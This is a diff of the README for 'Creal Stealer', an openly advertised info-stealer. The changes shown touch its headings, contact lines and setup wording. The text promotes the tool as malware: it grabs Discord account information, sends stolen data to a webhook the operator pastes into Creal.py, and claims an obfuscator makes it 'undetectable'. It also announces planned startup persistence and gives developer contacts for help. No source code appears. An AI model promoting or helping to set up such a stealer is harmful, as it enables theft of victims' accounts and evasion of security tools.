@@ -1,13 +1,11 @@
-<h1> Creal Stealer</h1> 
 <p align="center"> 
   <kbd>
 <img src="https://cdn.discordapp.com/attachments/864559355768602654/1040289089372557433/8df7a3389893f1d1ce1d4351c4076440.jpg" width="400"></img>
   </kbd>
 </p>
-<h2>  WE WİLL ADD START UP ! </h2>
-<p> If you need help you can write on discord Ayhu#1337 artonus#1000 </p>
-<p> If you need help you can write on telegram. Click to write (https://t.me/crealdevelopment) </p>
-
+<h1> Creal Stealer | In development...</h1> 
+<h2> [!] RUN ON STARTUP COMING SOON! </h2>
+<p> If you need help you can send a message on discord (Ayhu#1337 artonus#1000) or [Telegram](https://t.me/crealdevelopment) </p>
 
 ## Features:
 » Grab Discord Information and HQ Friends.
@@ -25,7 +23,7 @@
 
 ## Setup:
  
-First paste and save your webhook address instead of `"WEBHOOK HERE"` in Creal.py
+First paste and save your webhook address replacing `"WEBHOOK HERE"` in Creal.py
 
 If you use obfuscator it will be undetectable.
 
